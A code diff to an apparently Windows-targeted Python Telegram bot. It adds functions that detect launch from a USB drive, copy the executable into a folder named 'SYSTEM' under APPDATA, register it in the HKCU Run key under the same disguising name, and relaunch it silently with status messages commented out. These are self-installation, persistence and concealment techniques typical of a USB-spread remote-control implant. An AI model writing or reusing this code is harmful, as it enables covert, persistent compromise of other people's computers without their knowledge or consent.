@@ -2,6 +2,9 @@ import os
 import sys
 import winreg
 import asyncio
+import shutil
+import subprocess
+import ctypes
 
 from aiogram import Bot, Dispatcher, types
 from aiogram.fsm.context import FSMContext
@@ -38,7 +41,57 @@ def add_to_startup():
         pass
 
 
+def is_running_from_usb():
+    """Проверяет запущен ли бот с флешки"""
+    try:
+        exe_path = os.path.abspath(sys.argv[0])
+        drive = os.path.splitdrive(exe_path)[0] + '\\'
+        drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
+        # DRIVE_REMOVABLE = 2
+        return drive_type == 2
+    except:
+        return False
+
+
+def install_to_appdata():
+    """Копирует бота в APPDATA и запускает оттуда"""
+    try:
+        target_dir = os.path.join(os.environ['APPDATA'], 'SYSTEM')
+        os.makedirs(target_dir, exist_ok=True)
+
+        current_exe = os.path.abspath(sys.argv[0])
+        target_exe = os.path.join(target_dir, os.path.basename(current_exe))
+
+        if os.path.dirname(current_exe) == target_dir:
+            return False
+
+        shutil.copy2(current_exe, target_exe)
+
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
+                                 winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "SYSTEM", 0, winreg.REG_SZ, target_exe)
+            winreg.CloseKey(key)
+        except:
+            pass
+
+        # Запускаем копию
+        subprocess.Popen(target_exe, shell=True)
+
+        return True
+    except Exception as e:
+        print(f"Ошибка установки: {e}")
+        return False
+
+
 async def main():
+    # Проверяем, запущен ли с флешки
+    if is_running_from_usb():
+        # print("Запущено с флешки. Устанавливаю в APPDATA...")
+        if install_to_appdata():
+            # print("Установка завершена, перезапуск из APPDATA...")
+            return
+
     add_to_startup()
 
     setup_logging()
@@ -64,3 +117,5 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
+
+
